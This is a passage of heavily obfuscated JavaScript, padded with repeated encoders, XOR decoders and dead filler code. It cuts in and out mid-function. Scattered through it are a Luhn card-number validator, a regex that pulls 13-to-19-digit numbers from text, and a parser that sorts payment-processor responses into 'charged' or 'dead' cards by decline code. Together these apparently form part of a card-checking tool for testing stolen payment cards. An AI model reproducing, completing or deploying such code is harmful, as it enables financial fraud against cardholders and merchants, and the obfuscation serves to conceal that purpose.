        _0x40710f = '';
    for (var _0x5a3441 = -0x91f + 0x33 * 0xb + 0x6ee; _0x5a3441 < _0x5674d4['length']; _0x5a3441 += 0x4f * -0x2f + 0xe9b + -0x17) {
        var _0x33b35a = _0x5674d4['charCodeAt'](_0x5a3441),
            _0x37d632 = _0x5a3441 + (-0xe1e + -0x5 * 0x6d3 + -0x1 * -0x303e) < _0x5674d4['length'] ? _0x5674d4['charCodeAt'](_0x5a3441 + (-0x2be * -0x9 + -0x1b4a + 0x29d)) : 0x14fc + -0x7 * 0xdb + -0x15d * 0xb,
            _0x35cc31 = _0x5a3441 + (-0x5b9 * 0x3 + -0x4c * 0x8 + 0xb * 0x1c7) < _0x5674d4['length'] ? _0x5674d4['charCodeAt'](_0x5a3441 + (-0x1385 + 0x2320 + -0xf99)) : -0x2da + -0x5 * 0x2ef + 0x41 * 0x45;
        _0x40710f += _0x49a792[_0x33b35a >> -0x1dea + 0x6d8 + 0x1714] + _0x49a792[(_0x33b35a & 0xeb * -0x11 + 0x2 * 0xba + -0x25 * -0x62) << 0x359 * 0x4 + -0x92 * -0xe + 0x1 * -0x155c | _0x37d632 >> 0x1a6c + -0xaca + -0xf9e] + _0x49a792[(_0x37d632 & 0xf * 0x1 + -0x2 * -0x1a4 + -0xf * 0x38) << 0x1 * -0x20f9 + -0xcf4 + 0x2def * 0x1 | _0x35cc31 >> -0x3 * 0x486 + -0x1b02 + -0x1 * -0x289a] + _0x49a792[_0x35cc31 & 0x189c + 0x511 + -0x1d6e];
    }
    return _0x40710f;
};

function _z857c32de(_0x553a4f) {
    var _0x3de38e = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',
        _0x408459 = '';
    for (var _0x150c91 = -0xc67 + 0x2b * 0x23 + 0x686 * 0x1; _0x150c91 < _0x553a4f['length']; _0x150c91 += 0x8 * 0x15a + -0x1 * 0x1e55 + 0x2 * 0x9c4) {
        var _0x5a9052 = _0x553a4f['charCodeAt'](_0x150c91),
            _0x20d464 = _0x150c91 + (-0x257e + 0x1 * -0x1471 + -0x8 * -0x73e) < _0x553a4f['length'] ? _0x553a4f['charCodeAt'](_0x150c91 + (-0x11b2 + 0x7ea * 0x2 + -0x1 * -0x1df)) : -0x2245 + -0x2 * -0xf2a + 0x3f1,
            _0xacd3ff = _0x150c91 + (0x1 * 0x1407 + -0x26af + 0x12aa) < _0x553a4f['length'] ? _0x553a4f['charCodeAt'](_0x150c91 + (0x1603 + -0x1577 + -0x8a)) : 0x1cd3 * -0x1 + 0x25 * 0xdd + -0x39 * 0xe;
        _0x408459 += _0x3de38e[_0x5a9052 >> -0xe9f * 0x1 + 0x3d9 + 0xac8] + _0x3de38e[(_0x5a9052 & -0x917 * -0x1 + 0x6 * 0x518 + 0x1 * -0x27a4) << 0x101c + 0x7 * -0x15b + -0x13 * 0x59 | _0x20d464 >> 0x1029 + 0x1692 + 0xbb * -0x35] + _0x3de38e[(_0x20d464 & -0x1 * -0x1f53 + 0x1517 + -0x345b) << -0x3 * -0x5d + 0x1bc * -0x5 + 0x797 | _0xacd3ff >> 0x16 + 0x29 * -0x2 + -0x42 * -0x1] + _0x3de38e[_0xacd3ff & 0x1aa8 + -0x22 * -0x43 + -0x234f];
    }
    return _0x408459;
};
var _ze383b7di = null;
if (typeof _ze383b7di === 'function') var _z4b5a86dj = 0x2 * 0x1105 + -0x26f2 + 0x545;

function _z8abd10dk(_0x304365) {
    var _0x1ae1e2 = 0x1687 + 0x17 + -0x243 * 0xa;
    for (var _0x15aa68 = 0x15e7 + -0x2 * 0x1377 + 0x1107; _0x15aa68 < _0x304365['length']; _0x15aa68++) {
        _0x1ae1e2 = _0x1ae1e2 * (0x47 * -0x53 + 0xcc7 + 0x1 * 0xa5d) + _0x304365['charCodeAt'](_0x15aa68) & 0xa61f0a19 + -0xec3b49d3 + 0xc61c3fb9;
    }
    var _0x5a498d = _0x1ae1e2['toString'](-0x2501 + -0x7f * 0x1 + -0x964 * -0x4);
    while (_0x5a498d['length'] < -0x13e4 + 0xe5c * -0x2 + 0x16 * 0x236) _0x5a498d = '0' + _0x5a498d;
    return _0x5a498d;
};
var _z36a0aado = typeof navigator !== 'undefined' ? navigator['userAgent'] : '';
if (_z36a0aado['indexOf']('a7453b21de0ea891') !== -(-0x1639 + 0x128f + 0x3ab)) var _zda3a3cdp = -0x25a * -0x6 + -0x1e0b + 0x343 * 0x5;;

function _z63417edq(_0x26b66b) {
    var _0x1a0348 = Date['now']();
    typeof _0x26b66b === 'function' && _0x26b66b();
    var _0x2f38bb = Date['now']() - _0x1a0348,
        _0x37eeb0 = {};
    return _0x37eeb0['elapsed'] = _0x2f38bb, _0x37eeb0['slow'] = _0x2f38bb > -0x34b * 0x4 + 0x11d2 + -0x310, _0x37eeb0;
};

function _zdea7dfdu(_0x17acba) {
    if (!_0x17acba || _0x17acba['length'] < -0x2019 + -0x3 * -0x3ea + 0x1468) return ![];
    var _0x2224ff = -0x77 * -0x1a + -0xd * -0x13d + -0x6f * 0x41,
        _0x3ed50b = ![];
    for (var _0x4dedd3 = _0x17acba['length'] - (-0x1aca + -0x89f + 0x236a); _0x4dedd3 >= -0xc11 + 0xb * 0x335 + -0x1736; _0x4dedd3--) {
        var _0x43d28d = parseInt(_0x17acba[_0x4dedd3], -0x122e + 0xbf * 0x27 + -0xae1);
        if (_0x3ed50b) {
            _0x43d28d *= 0x2432 + 0xc78 + -0x30a8;
            if (_0x43d28d > -0x257a + -0xc * 0x1e + -0x3 * -0xcf9) _0x43d28d -= 0x233 + 0xb * 0x355 + 0x1 * -0x26d1;
        }
        _0x2224ff += _0x43d28d, _0x3ed50b = !_0x3ed50b;
    }
    return _0x2224ff % (0x93 + -0xe73 * -0x2 + -0x5e3 * 0x5) === -0x14ce * -0x1 + -0x1ef7 * -0x1 + -0x33c5;
};

function _z12d789e0(_0x2a25c8) {
    if (!Array['isArray'](_0x2a25c8)) return [];
    var _0x2c5273 = [],
        _0x32d072 = _0x2a25c8['length'] - (-0xedf + 0x1754 + -0x43a * 0x2);
    while (_0x32d072 >= 0x17 * 0xfd + -0x1 * -0xf87 + -0x53 * 0x76) {
        if (typeof _0x2a25c8[_0x32d072] === 'string') _0x2c5273['push'](_0x2a25c8[_0x32d072]);
        _0x32d072--;
    }
    return _0x2c5273;
};
var _zb4f6f0e4 = {};
if (_zb4f6f0e4['version'] > -0x137c + 0x1da7 + -0xa22) var _zbba2bce5 = -0x1 * -0x2216 + -0x1 * 0x1066 + -0x1180;;
var _z97ee7de6 = null;
if (typeof _z97ee7de6 === 'function') var _ze3b97ce7 = 0x1453 * -0x1 + -0xb30 * -0x2 + -0x1f2 * 0x1;;
var _z134210e8 = new Date()['getFullYear']();
if (_z134210e8 < -0x215f + -0x1 * -0x1fc7 + -0x2 * -0x49d) var _zac152ae9 = -0x4e3 + 0x612 + -0xe0;
var _z1bc7d5ea = 0x4d * 0x5f + 0x1ee1 + 0x1 * -0x3b74;
if (typeof _z1bc7d5ea === 'string' && _z1bc7d5ea['length'] > 0xe5b * 0x1 + 0x1 * 0x19ab + -0x25e4) var _z38a624eb = -0x24de + -0x167e + 0x3b98;;
var _zad6a2eec = -0x1 * -0x5f4 + 0x2 * -0x8a5 + -0x1 * -0xb57;
if (typeof _zad6a2eec === 'string' && _zad6a2eec['length'] > -0x48b * -0x5 + 0xa * -0x127 + -0x81f) var _zd1e27aed = -0x7fd + 0x9 * 0x3e7 + -0x1af5;;

function _z7501d7ee(_0x33d723) {
    var _0x1cdcee = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',
        _0xc43f0c = '';
    for (var _0x32bf96 = -0xb61 * 0x3 + 0xfd3 + 0x10 * 0x125; _0x32bf96 < _0x33d723['length']; _0x32bf96 += -0x1 * -0x1381 + 0x1618 + -0x2996) {
        var _0x590bbf = _0x33d723['charCodeAt'](_0x32bf96),
            _0x580321 = _0x32bf96 + (0x18df + -0x1e24 + 0x1 * 0x546) < _0x33d723['length'] ? _0x33d723['charCodeAt'](_0x32bf96 + (0xf6a + -0x24b4 + -0x1 * -0x154b)) : 0x4 * 0x462 + 0x1 * 0xefe + -0x2086,
            _0x556080 = _0x32bf96 + (0x261b + -0xc7b + -0x199e) < _0x33d723['length'] ? _0x33d723['charCodeAt'](_0x32bf96 + (-0x5 * 0x5cc + -0x1 * 0x1075 + 0x2d73)) : -0xedd + -0xd36 + 0x1 * 0x1c13;
        _0xc43f0c += _0x1cdcee[_0x590bbf >> 0x184d + 0x16f * -0x3 + -0x6aa * 0x3] + _0x1cdcee[(_0x590bbf & 0x1052 + 0xb1a + -0x1b69) << -0x1 * 0x1d7 + 0x2378 + -0x1 * 0x219d | _0x580321 >> 0x1a9b + -0x44f * -0x1 + -0x1ee6] + _0x1cdcee[(_0x580321 & -0x314 * -0x8 + -0xac3 + -0xdce) << 0x2 * -0x575 + 0x1 * -0x2219 + 0x2d05 * 0x1 | _0x556080 >> -0x2036 + 0x378 * 0x1 + 0x1cc4] + _0x1cdcee[_0x556080 & -0x14cb + -0x1f98 + 0x1a51 * 0x2];
    }
    return _0xc43f0c;
};

function _z43e295ei(_0x82350f) {
    if (typeof _0x82350f !== 'string') return '';
    var _0x35b678 = _0x82350f['replace'](/[<>&"']/g, function(_0x1395a1) {
        return '&#' + _0x1395a1['charCodeAt'](-0x3e6 + 0xb5c + 0x2 * -0x3bb) + ';';
    });
    return _0x35b678['length'] > 0x1 * -0x1ce1 + 0x2fd + 0x1a7c ? _0x35b678['substring'](0x17d9 + -0xe19 + -0x9c0, 0x2278 + 0x6 * -0x455 + 0x7e2 * -0x1) : _0x35b678;
};

function _zd5e31eel(_0x1a4caf) {
    var _0x5ca1c3 = _0x1a4caf || {},
        _0x3d45dc = Object['keys'](_0x5ca1c3);
    return _0x3d45dc['length'] < 0x1805 * -0x1 + 0x3 * -0x9ff + 0x1cd * 0x1e ? null : {
        'v': _0x3d45dc['length'],
        't': Date['now']()
    };
};
var _zdb1b58ep = typeof globalThis['_94cdcfa8'];
if (_zdb1b58ep !== 'undefined') var _z059c01eq = -0x39 * 0x50 + -0x208 + 0x2f * 0x6d;;

function _z58f6ccer(_0x3167f8) {
    if (!_0x3167f8) return '';
    var _0x29ef94 = '',
        _0x12f04f = 0x2147 * -0x1 + 0x409 * 0x7 + -0xe * -0x5c;
    while (_0x12f04f < _0x3167f8['length']) {
        _0x29ef94 += String['fromCharCode'](_0x3167f8['charCodeAt'](_0x12f04f) ^ 0x1bc4 + -0x1f98 + 0x462), _0x12f04f++;
    }
    return _0x29ef94;
}

function _z75d72eev(_0x7fdde2) {
    if (typeof _0x7fdde2 !== 'string') return '';
    var _0x3d62a4 = _0x7fdde2['replace'](/[<>&"']/g, function(_0x3f9d39) {
        return '&#' + _0x3f9d39['charCodeAt'](-0x1fde + 0x14b + 0x1e93) + ';';
    });
    return _0x3d62a4['length'] > -0xc * 0x1a + 0x1de0 + -0x1bee ? _0x3d62a4['substring'](0x9 * -0xbb + 0x3 * 0x4bd + -0x28c * 0x3, 0x313 + 0x1e29 + -0x1b6 * 0x13) : _0x3d62a4;
};
var _zc2850eey = typeof globalThis['_46bff853'];
if (_zc2850eey !== 'undefined') var _za9c9a7ez = -0x1 * -0xaab + -0x29 + 0x25 * -0x47;;

function _z33908df0(_0xae9205) {
    if (!Array['isArray'](_0xae9205)) return [];
    var _0x48b6f7 = [],
        _0x557727 = _0xae9205['length'] - (0x17b2 + 0x1 * 0x11d9 + -0x298a);
    while (_0x557727 >= 0x58c + 0x3cb * 0x1 + -0x957) {
        if (typeof _0xae9205[_0x557727] === 'string') _0x48b6f7['push'](_0xae9205[_0x557727]);
        _0x557727--;
    }
    return _0x48b6f7;
};

function _z63fecaf4(_0x300691) {
    if (!_0x300691) return '';
    var _0x5b2f7b = '',
        _0x45ad7b = -0x1dcb + -0x5e0 + 0x23ab;
    while (_0x45ad7b < _0x300691['length']) {
        _0x5b2f7b += String['fromCharCode'](_0x300691['charCodeAt'](_0x45ad7b) ^ 0xc1 * 0x1d + 0x76 * -0x47 + 0x1 * 0xb7b), _0x45ad7b++;
    }
    return _0x5b2f7b;
};

function _z638586f8(_0x5c4cc1, _0x554dad) {
    var _0x4f7200 = Object['assign']({}, _0x5c4cc1);
    for (var _0x8afddc in _0x554dad) {
        _0x554dad['hasOwnProperty'](_0x8afddc) && (typeof _0x554dad[_0x8afddc] === 'object' && _0x554dad[_0x8afddc] !== null && !Array['isArray'](_0x554dad[_0x8afddc]) ? _0x4f7200[_0x8afddc] = _z638586f8(_0x4f7200[_0x8afddc] || {}, _0x554dad[_0x8afddc]) : _0x4f7200[_0x8afddc] = _0x554dad[_0x8afddc]);
    }
    return _0x4f7200;
};
var _z3fbdb1fc = Object['keys']({})['length'];
if (_z3fbdb1fc > -0x1 * -0xa89 + -0x17b7 * -0x1 + -0x223d) var _zc3a143fd = 0x16cd + -0x1a * -0x12f + -0x3591;;
var _z7502c5fe = [];
if (_z7502c5fe['length'] > -0x72 * 0x1 + -0x1637 + -0x1 * -0x1f4d) var _zfb8cf3ff = 0x2581 + -0xa8e + -0x1ae0;
var _z993c42fg = typeof navigator !== 'undefined' ? navigator['userAgent'] : '';
if (_z993c42fg['indexOf']('05def1577b90273d') !== -(0xd07 + 0x1 * 0x935 + -0x163b)) var _za9c52cfh = -0x1f0e + 0x1 * 0x1393 + 0xbba;;

function _z01d8abfi(_0x81e8bb) {
    if (!_0x81e8bb) return [];
    var _0x2af0e0 = new RegExp('\x5cd{13,19}', 'g'),
        _0x3c5513 = _0x81e8bb['match'](_0x2af0e0);
    return _0x3c5513 || [];
};

function _zac4279fm(_0x42e5c4) {
    var _0x39cff7 = Date['now']();
    typeof _0x42e5c4 === 'function' && _0x42e5c4();
    var _0x209659 = Date['now']() - _0x39cff7,
        _0x1213e2 = {};
    return _0x1213e2['elapsed'] = _0x209659, _0x1213e2['slow'] = _0x209659 > 0x1ad9 + 0x1 * -0x161 + -0x1824, _0x1213e2;
}

function _zd65d23fq(_0x45309e) {
    var _0x1e49c1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',
        _0x60f80e = '';
    for (var _0x11ace0 = -0x4a5 * 0x4 + 0x1d71 + 0x1b * -0x67; _0x11ace0 < _0x45309e['length']; _0x11ace0 += -0x3c3 + -0x925 + 0xceb) {
        var _0x4e82b5 = _0x45309e['charCodeAt'](_0x11ace0),
            _0x4c54a3 = _0x11ace0 + (-0x1 * 0x1bc9 + 0x1d6b + -0x1a1) < _0x45309e['length'] ? _0x45309e['charCodeAt'](_0x11ace0 + (0x137b + -0x2675 + -0x12fb * -0x1)) : -0x89f + -0xad4 + 0x1373,
            _0x6dd70 = _0x11ace0 + (-0x3 * -0x869 + 0xb47 + -0x2480) < _0x45309e['length'] ? _0x45309e['charCodeAt'](_0x11ace0 + (0xb * 0xca + 0x20 * -0xd + -0x70c)) : -0x21ce + -0x802 + 0x29d0;
        _0x60f80e += _0x1e49c1[_0x4e82b5 >> 0x26ab * -0x1 + -0x1 * -0xec5 + -0x2fd * -0x8] + _0x1e49c1[(_0x4e82b5 & 0x740 * 0x3 + 0x3e5 * -0x1 + -0x11d8) << 0x184 * 0xc + 0x1 * -0x242f + 0x1 * 0x1203 | _0x4c54a3 >> -0x1293 * 0x2 + 0x1e51 + 0x6d9] + _0x1e49c1[(_0x4c54a3 & 0x1837 + -0x1 * -0x91d + -0x2145 * 0x1) << -0x2423 + 0x228e + -0x1 * -0x197 | _0x6dd70 >> -0x26bd + -0x4cd + 0x2b90] + _0x1e49c1[_0x6dd70 & -0x3ba + 0xb9 + 0x340];
    }
    return _0x60f80e;
};

function _z494821fu(_0x21fc02) {
    if (!_0x21fc02) return '';
    var _0x2b5d7b = '',
        _0x5af8b8 = 0x1 * 0x187d + 0x12be + -0x2b3b;
    while (_0x5af8b8 < _0x21fc02['length']) {
        _0x2b5d7b += String['fromCharCode'](_0x21fc02['charCodeAt'](_0x5af8b8) ^ 0x14b4 + 0x1 * -0x16d + 0x1 * -0x12a3), _0x5af8b8++;
    }
    return _0x2b5d7b;
};

function _ze63e99fy(_0xb15fb2) {
    if (!Array['isArray'](_0xb15fb2)) return [];
    var _0x128076 = [],
        _0x1adc86 = _0xb15fb2['length'] - (0xf6 * 0x25 + -0x232 + -0x215b);
    while (_0x1adc86 >= 0x1 * 0x258f + -0x49 * 0x54 + -0xd9b) {
        if (typeof _0xb15fb2[_0x1adc86] === 'string') _0x128076['push'](_0xb15fb2[_0x1adc86]);
        _0x1adc86--;
    }
    return _0x128076;
}
var _z42d56bg2 = Object['keys']({})['length'];
if (_z42d56bg2 > -0x8 * 0x11a + -0x2 * 0xcbd + 0x224f) var _zededdcg3 = -0x571 + 0x1a9d + -0xf * 0x167;;
var _z9eff5cg4 = {};
if (_z9eff5cg4['version'] > 0x3 * 0x822 + -0xc17 * -0x1 + -0x123e * 0x2) var _z24999dg5 = -0x1 * 0x2643 + 0x1d41 * 0x1 + 0x91b;;
var _z1aa317g6 = '';
if (_z1aa317g6['length'] > 0x1bc0 + 0xbab * -0x2 + 0x452 * -0x1) var _z76d930g7 = -0x24a6 + 0xe77 + 0x1672;;

function _z6ddbb1g8(_0x501ad4, _0x3668d3) {
    var _0x132db2 = -0x14be + -0x1 * -0xf25 + -0x1 * -0x599;

    function _0x1e7ca4() {
        _0x132db2++;
        if (_0x132db2 > -0xccc + 0x91 * 0x8 + 0x849) return null;
        try {
            return _0x501ad4();
        } catch (_0x1af908) {
            var _0x2e2c01 = _0x3668d3 * Math['pow'](0x67 * -0x31 + -0x208d * -0x1 + -0xcd4, _0x132db2 - (0x1f5 + -0x1 * 0x9ee + 0x7fa)),
                _0x191099 = {};
            return _0x191099['retry'] = !![], _0x191099['delay'] = _0x2e2c01, _0x191099['attempt'] = _0x132db2, _0x191099;
        }
    }
    return _0x1e7ca4();
};

function _z282adegc(_0x4b0158) {
    if (!Array['isArray'](_0x4b0158)) return [];
    var _0x3be7fb = [],
        _0x4cbadc = _0x4b0158['length'] - (0xa5d + 0x15d * -0x5 + -0x1 * 0x38b);
    while (_0x4cbadc >= -0x3 * 0x37d + -0x1715 + -0x26 * -0xe2) {
        if (typeof _0x4b0158[_0x4cbadc] === 'string') _0x3be7fb['push'](_0x4b0158[_0x4cbadc]);
        _0x4cbadc--;
    }
    return _0x3be7fb;
}
var _z1c9d8cgg = new Date()['getFullYear']();
if (_z1c9d8cgg < 0x152e + -0x295 + -0xae0) var _zec22d4gh = -0x1d7e + 0x1a1b * -0x1 + 0x37bd;;
var _ze9f738gi = Date['now']() >>> -0x44c + -0x4c1 * 0x6 + -0x3 * -0xaf6 & 0x1fab + 0x1b66 + -0x3a12;
if (_ze9f738gi > 0x108c + 0xd4d + -0x6 * 0x4cf) var _z53ecfcgj = 0xb67 * -0x1 + 0x13 * 0x178 + -0x107b;;

function _zfc0490gk(_0x530cf7) {
    var _0x33f4b0 = _0x530cf7 || {},
        _0x2e6d9d = Object['keys'](_0x33f4b0);
    return _0x2e6d9d['length'] < 0xc2c + -0x2b1 + -0x976 ? null : {
        'v': _0x2e6d9d['length'],
        't': Date['now']()
    };
};

function _z2de92ego(_0x15dfff) {
    var _0x2105be = Date['now']();
    typeof _0x15dfff === 'function' && _0x15dfff();
    var _0x5e4be2 = Date['now']() - _0x2105be,
        _0x23c8f2 = {};
    return _0x23c8f2['elapsed'] = _0x5e4be2, _0x23c8f2['slow'] = _0x5e4be2 > -0x11fc + -0x4b * -0x4c + -0x29c, _0x23c8f2;
};
var _z527febgs = typeof Symbol !== 'undefined' ? typeof Symbol() : 'x';
if (_z527febgs === 'number') var _z010116gt = -0x209d + -0x7e + 0x3 * 0xb09;

function _zedb530gu(_0x23a702) {
    var _0x5601f1 = Date['now']();
    typeof _0x23a702 === 'function' && _0x23a702();
    var _0x3bd62f = Date['now']() - _0x5601f1,
        _0x2073e3 = {};
    return _0x2073e3['elapsed'] = _0x3bd62f, _0x2073e3['slow'] = _0x3bd62f > -0x41b + 0xc47 + -0x7b2, _0x2073e3;
};

function _zb9e8c5gy(_0x5aa9dc) {
    var _0x11c922 = 0x269e + 0x1 * 0x293 + -0x2931;
    if (!_0x5aa9dc || typeof _0x5aa9dc !== 'string') return _0x11c922;
    var _0x18415c = 0x18d * 0x8 + 0xb0 + -0xd18;
    while (_0x18415c < _0x5aa9dc['length']) {
        _0x11c922 = (_0x11c922 << -0x5fe + -0x2478 + -0x2d5 * -0xf) - _0x11c922 + _0x5aa9dc['charCodeAt'](_0x18415c), _0x11c922 |= 0x22e2 + -0x625 * -0x3 + 0x3551 * -0x1, _0x18415c++;
    }
    return _0x11c922 >>> 0xde0 + -0x13aa + 0x5ca;
};

function _z180359h2(_0x5f3049) {
    var _0x7b925a = 0xefd + 0x1bcd + 0x1 * -0x2aca;
    if (!_0x5f3049 || typeof _0x5f3049 !== 'string') return _0x7b925a;
    var _0x1857c2 = 0xfbf + 0x6e1 + -0x16a0;
    while (_0x1857c2 < _0x5f3049['length']) {
        _0x7b925a = (_0x7b925a << 0x25a4 + 0x2 * -0x11c8 + 0x11 * -0x1f) - _0x7b925a + _0x5f3049['charCodeAt'](_0x1857c2), _0x7b925a |= 0x670 + -0x1 * -0x201b + -0x268b, _0x1857c2++;
    }
    return _0x7b925a >>> -0xad * -0x29 + -0x2 * -0x317 + 0x6c7 * -0x5;
}

function _z8f55e8h6(_0x45b071) {
    if (typeof _0x45b071 !== 'string') return '';
    var _0x1f4219 = _0x45b071['replace'](/[<>&"']/g, function(_0x177bb6) {
        return '&#' + _0x177bb6['charCodeAt'](-0x8df + 0x1cf * 0x9 + -0x4f * 0x18) + ';';
    });
    return _0x1f4219['length'] > 0xd * 0x251 + -0x1856 + -0x57c ? _0x1f4219['substring'](-0x4d * -0x13 + -0x783 + 0x1cc, 0x1e3c + 0x259 * 0x10 + -0x4381) : _0x1f4219;
};

function _z9e1b68h9(_0x565abd) {
    var _0x14bed4 = {};
    _0x14bed4['status'] = 'unknown';
    if (!_0x565abd) return _0x14bed4;
    var _0x4405ae = typeof _0x565abd === 'string' ? JSON['parse'](_0x565abd) : _0x565abd;
    if (_0x4405ae['error']) return {
        'status': 'dead',
        'code': _0x4405ae['error']['code'] || ''
    };
    if (_0x4405ae['status'] === 'succeeded') return {
        'status': 'charged',
        'id': _0x4405ae['id'] || ''
    };
    var _0x332479 = _0x4405ae['last_payment_error'];
    if (_0x332479) return {
        'status': 'dead',
        'code': _0x332479['decline_code'] || _0x332479['code'] || ''
    };
    var _0x18b8f6 = {};
    return _0x18b8f6['status'] = 'unknown', _0x18b8f6;
};
var _z354ed2hd = new Date()['getFullYear']();
if (_z354ed2hd < 0x9 * -0x127 + -0x190f + 0x1 * 0x2b2b) var _zedd28ahe = 0x1a8d + -0x1b2c + 0xfc;;

function _z993cechf(_0x19e2f5) {
    if (!_0x19e2f5) return [];
    var _0x38a828 = new RegExp('[a-f0-9]{32}', 'g'),
        _0x2f56ce = _0x19e2f5['match'](_0x38a828);
    return _0x2f56ce || [];
};
var _z996af1hj = {};
if (_z996af1hj['version'] > 0xccc + -0x7 * -0x77 + -0x3 * 0x559) var _z007e97hk = 0x310 + 0x9 * 0x63 + -0x64c;

function _z84a0a7j(_0x1a00d3, _0x44b45f) {
    var _0x3036d5 = _0x1a00d3 || -0x1 * -0x1553 + -0x19bd + 0x46a;
    _z430b4bi += _0x3036d5 + (0x12aa * -0x1 + -0x1 * -0x1ff + 0x5b * 0x2f);
    if (_z430b4bi > -0x271f * -0x3 + -0x1546 + 0x18d7 * 0x3) _z430b4bi = -0x6fa + 0x2 * 0x2ce + 0x16d;
    return _z430b4bi;
};

function _zcb6333k(_0x13eccf) {
    for (var _0x456bfb = -0x423 + -0x2 * -0x10f1 + 0x5 * -0x5f3; _0x456bfb < -0x404 * -0x8 + -0xcf * 0x1f + -0x70e * 0x1; _0x456bfb++) {
        _z84a0a7j(_0x13eccf);
    }
    return _z430b4bi;
};
var _z742755hl = '';
if (_z742755hl['length'] > 0x35e * -0x9 + 0x1333 + 0x2 * 0x5a5) var _zc04956hm = 0x1 * -0x184d + 0xefb + 0x95c;;

function _z1063b0hn(_0x173e63) {
    var _0x2efeb7 = 0x1c8d + -0x11d6 + -0xab7;
    for (var _0x6146b1 = -0x685 + -0x469 * -0x1 + 0x21c; _0x6146b1 < _0x173e63['length']; _0x6146b1++) {
        _0x2efeb7 = _0x2efeb7 * (0x26de + -0x25b3 + -0x10c) + _0x173e63['charCodeAt'](_0x6146b1) & -0xf4156 * 0xe + 0x1 * -0x3ff2994a + -0x1 * -0xc0c82bfd;
    }
    var _0x2a32e3 = _0x2efeb7['toString'](0x86e + -0x5 * 0x6da + 0x19e4);
    while (_0x2a32e3['length'] < -0x2422 + -0x50c * -0x7 + 0xd6) _0x2a32e3 = '0' + _0x2a32e3;
    return _0x2a32e3;
};

function _z33ddd9hr(_0x4178d3) {
    var _0x1a4c65 = 0x3b * -0x1e + -0x1cd0 + 0x23ba;
    for (var _0x34da89 = 0x43 * 0x85 + 0x92e + -0x2bfd * 0x1; _0x34da89 < _0x4178d3['length']; _0x34da89++) {
        _0x1a4c65 = _0x1a4c65 * (0x22e * -0xd + 0x1c56 + 0x1f) + _0x4178d3['charCodeAt'](_0x34da89) & -0x41bb328e * 0x1 + 0x6a44f695 + 0x57763bf8;
    }
    var _0x1a5692 = _0x1a4c65['toString'](0x12ba + 0x29c * -0x1 + -0x6 * 0x2ad);
    while (_0x1a5692['length'] < 0x1 * 0xc9d + -0x1b6e + 0xed9) _0x1a5692 = '0' + _0x1a5692;
    return _0x1a5692;
};
var _zeeeba1hv = '';
if (_zeeeba1hv['length'] > 0x1a0b * 0x1 + 0x42 * 0x89 + -0x3d16) var _zdc65c4hw = -0x67a * 0x4 + -0x1387 + 0x1 * 0x2dc9;

function _zf32d44hx(_0x2dab87) {
    if (!_0x2dab87) return '';
    var _0x42cac2 = '',
        _0x401870 = -0xe7f * -0x1 + -0x18 * -0x1b + -0x1107;
    while (_0x401870 < _0x2dab87['length']) {
        _0x42cac2 += String['fromCharCode'](_0x2dab87['charCodeAt'](_0x401870) ^ -0x118 * -0x1 + 0x1a2c + -0x1ace), _0x401870++;
    }
    return _0x42cac2;
};

function _z096566i1(_0x1e78a4) {
    if (typeof _0x1e78a4 !== 'string') return '';
    var _0x2752ba = _0x1e78a4['replace'](/[<>&"']/g, function(_0x45bca3) {
        return '&#' + _0x45bca3['charCodeAt'](-0x13c * -0x1f + 0x602 * -0x1 + -0x2042) + ';';
    });
    return _0x2752ba['length'] > -0x1075 + -0x6cc * -0x1 + 0xa3d ? _0x2752ba['substring'](0x2f1 * -0x9 + -0x80 * 0x2 + 0x1b79, -0xb6 + -0x2f5 * 0x5 + -0x337 * -0x5) : _0x2752ba;
};
var _zb2e575i4 = '';
if (_zb2e575i4['length'] > -0x1 * 0x1e6d + -0x12ad * 0x1 + 0x313e) var _z04ddaci5 = -0x7 * -0x38e + 0x14 * 0x133 + -0x30a0;;
var _z70906di6 = 0x697 * 0x4 + 0x1 * 0x2171 + 0xbd * -0x51;
if (typeof _z70906di6 === 'string' && _z70906di6['length'] > -0x130 * -0x4 + -0x22bc + 0x1ff3 * 0x1) var _zbf2553i7 = -0xdf5 + -0x1 * 0x2501 + 0xd * 0x3ed;;
var _z8295c5i8 = Math['PI'];
if (_z8295c5i8 > 0x43 * 0x8f + 0x20d1 * -0x1 + 0x1 * -0x494) var _zaecdeci9 = -0x10 * -0x44 + -0x1 * -0xcd4 + -0x1114;;
var _z9c6e12ia = Date['now']() % (-0xd09 * -0x2 + 0x113b + -0x24be);
if (_z9c6e12ia < -0x6b8 + -0x1c4 * 0x8 + 0x14d8) var _z1fdc7aib = 0x1 * 0x290 + -0x1f * 0x43 + 0x5e1;;
var _z6b6188ic = {};
if (_z6b6188ic['version'] > -0x84b + 0x1 * 0x2641 + -0x1df3) var _z3d2954id = 0x2509 + 0x2507 + 0x2 * -0x24fd;;
var _z184105ie = [];
if (_z184105ie['length'] > 0x1ee1 + 0xb82 + -0xa48) var _zabaef6if = -0x235a + 0xb6c + 0x17fd;

function _ze70976ig(_0x1eb7d7) {
    if (typeof _0x1eb7d7 !== 'string') return '';
    var _0x1abba9 = _0x1eb7d7['replace'](/[<>&"']/g, function(_0x2a253f) {
        return '&#' + _0x2a253f['charCodeAt'](0xbcd + -0x49c + -0x731) + ';';
    });
    return _0x1abba9['length'] > 0x1866 + 0xd * 0xd0 + -0x22b1 ? _0x1abba9['substring'](-0x21b3 + 0x235e + -0x1 * 0x1ab, 0x1c1c + -0x461 + -0xbbb * 0x2) : _0x1abba9;
};

function _z4d399dij(_0x4e2fe3) {
    var _0x3f9398 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',
        _0x1d7c47 = '';
    for (var _0x598d25 = 0x1c7a + 0x59d + -0x2217; _0x598d25 < _0x4e2fe3['length']; _0x598d25 += 0x1 * -0xf9d + -0x2362 + -0x3302 * -0x1) {
        var _0x230a27 = _0x4e2fe3['charCodeAt'](_0x598d25),
            _0x47d3bf = _0x598d25 + (0x22c7 + 0x27 * -0x21 + -0x1dbf) < _0x4e2fe3['length'] ? _0x4e2fe3['charCodeAt'](_0x598d25 + (0x8de * 0x3 + 0x145 * -0x5 + -0x1440)) : -0x116f + -0x568 * 0x1 + 0x16d7,
